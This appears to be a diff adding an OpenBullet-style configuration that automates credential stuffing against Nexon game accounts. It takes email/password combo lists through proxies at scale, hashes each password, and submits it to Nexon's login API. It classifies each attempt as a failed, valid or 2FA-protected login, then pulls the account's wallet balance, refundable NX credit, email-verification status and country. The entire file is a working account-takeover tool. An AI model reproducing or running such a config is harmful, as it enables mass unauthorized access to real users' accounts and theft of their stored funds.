@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "Nexon_Huffy",
+  "SuggestedBots": 150,
+  "LastModified": "2019-04-07T01:36:07.0695973+08:00",
+  "AdditionalInfo": "",
+  "Author": "Huffy",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Hash SHA512 "<PASS>" -> VAR "passhash" 
+REQUEST POST "https://www.nexon.com/account-webapi/login" 
+  CONTENT "{\"id\":\"<USER>\",\"password\":\"<passhash>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "NOT_EXIST_USER" 
+    KEY "WRONG_PASSWORD" 
+    KEY "INVALID_PARAMETER" 
+    KEY "User does not exist" 
+  KEYCHAIN Success OR 
+    KEY "hashed_user_no" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "PROTECTED_USER_N_MODE" 
+REQUEST GET "https://www.nexon.com/wallet-api/balance" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Please register country code" 
+PARSE "<SOURCE>" LR "Amount\":" ",\"Type\":\"Total" -> CAP "Total NX Credit" 
+PARSE "<SOURCE>" LR "\":\"Total\"},{\"Amount\":" ",\"Type\":\"Refundable" -> CAP "Refundable NX Credit" 
+PARSE "<SOURCE>" LR "IsEmailVerified\":" ",\"" -> CAP "Email Verified" 
+PARSE "<SOURCE>" LR "CountryCode\":\"" "\"," -> CAP "Country" 
